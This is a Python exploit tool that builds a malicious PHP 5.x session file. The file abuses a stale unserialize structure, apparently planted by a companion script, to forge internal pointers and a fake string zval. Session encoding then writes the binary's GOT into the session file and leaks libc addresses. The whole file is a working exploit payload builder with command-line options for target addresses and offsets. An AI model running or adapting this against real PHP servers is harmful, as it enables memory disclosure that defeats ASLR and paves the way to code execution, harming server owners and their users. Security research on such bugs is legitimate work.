#!/usr/bin/env python3
"""Build a PHP 5.x session-file libc leak payload (php_binary, two records).

The session file is read into X1 (emalloc(file_size)); the stale
php_unserialize_data P (left by plant.php) lies inside that buffer at
X1 + poff, so the file bytes overwrite the fake var_entries pointers.

Record 1 (key = 32 spaces) has the value `R:1057;`.  var_access() walks to
the fake `first` block and reads data[1056], which we place at file offset
0x300; that qword points at a fake zval struct inside the same buffer
(offset 0x340 by default).  The fake zval is IS_STRING with
value.str.val = --got and value.str.len = --slen, so the session encode
writes --slen bytes of the non-PIE binary's GOT into the session file.

The dtor pushes (R: pre-push, R: top push, string top push) are steered
into a fake dtor block inside the buffer (used_slots at file offset --doff)
so PS(serializer) / PS(http_session_vars) are NOT touched and the normal
php_binary encode still runs.
"""
import argparse, struct

FILESIZE = 0x400
U1 = 0x200          # first block used_slots / data[1056] lands at 0x300
U2 = 0x220          # last block used_slots
LSTR = 973


def build(x1, poff, got, slen, doff=0x380, idx=1057, fzoff=0x340,
          marker_key=None):
    # record 1: 0x20, 32-byte key, R:idx;
    key = marker_key if marker_key else b" " * 32
    assert len(key) == 32
    rec1 = bytes([32]) + key + ("R:%d;" % idx).encode()
    assert len(rec1) == 0x28, hex(len(rec1))

    hdr = ("s:%d:\"" % LSTR).encode()
    off = len(rec1)
    payload_start = off + 2 + len(hdr)
    assert payload_start + LSTR + 2 == FILESIZE

    buf = bytearray(b"A" * FILESIZE)
    buf[0:len(rec1)] = rec1
    buf[off] = 1
    buf[off + 1] = ord("z")
    buf[off + 2:off + 2 + len(hdr)] = hdr
    buf[payload_start + LSTR:payload_start + LSTR + 2] = b"\";"

    def putq(o, v):
        buf[o:o + 8] = struct.pack("<Q", v & ((1 << 64) - 1))

    def putd(o, v):
        buf[o:o + 4] = struct.pack("<I", v & 0xFFFFFFFF)

    first = x1 + U1 - 0x2000
    last = x1 + U2 - 0x2000
    last_dtor = x1 + doff - 0x2000
    fz = x1 + fzoff

    # fake php_unserialize_data at P = X1 + poff
    putq(poff + 0x00, first)
    putq(poff + 0x08, last)
    putq(poff + 0x10, 0)              # first_dtor = NULL
    putq(poff + 0x18, last_dtor)

    putq(U1, 0x1000)                  # first->used_slots = 4096 (> idx)
    putq(U2, 0)                       # last->used_slots (unused)
    putq(doff, 0)                     # last_dtor->used_slots = 0

    slot = U1 - 0x2000 + (idx - 1) * 8
    assert slot == 0x300, hex(slot)
    putq(slot, fz)                    # data[idx-1] = fake zval pointer

    # fake zval (5.x layout: value 16 bytes, refcount +0x10, type +0x14)
    putq(fzoff + 0x00, got)           # value.str.val
    putd(fzoff + 0x08, slen)          # value.str.len
    putd(fzoff + 0x10, 0x100000)      # refcount
    buf[fzoff + 0x14] = 6             # IS_STRING
    buf[fzoff + 0x15] = 0             # is_ref

    info = dict(x1=x1, p=x1 + poff, got=got, slen=slen, fz=fz,
                first=first, last=last, last_dtor=last_dtor, doff=doff)
    return bytes(buf), info


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", required=True)
    ap.add_argument("--x1", type=lambda s: int(s, 0), required=True)
    ap.add_argument("--poff", type=lambda s: int(s, 0), required=True)
    ap.add_argument("--got", type=lambda s: int(s, 0), required=True)
    ap.add_argument("--slen", type=int, default=4096)
    ap.add_argument("--doff", type=lambda s: int(s, 0), default=0x380)
    ap.add_argument("--idx", type=int, default=1057)
    ap.add_argument("--fzoff", type=lambda s: int(s, 0), default=0x340)
    ap.add_argument("--key", default=None)
    a = ap.parse_args()
    payload, info = build(a.x1, a.poff, a.got, a.slen, a.doff, a.idx,
                          a.fzoff, a.key.encode() if a.key else None)
    open(a.out, "wb").write(payload)
    print("wrote %s (%d bytes)" % (a.out, len(payload)))
    for k in ("x1", "p", "got", "slen", "fz", "first", "last", "last_dtor"):
        print("  %-10s 0x%x" % (k, info[k] & ((1 << 64) - 1)))
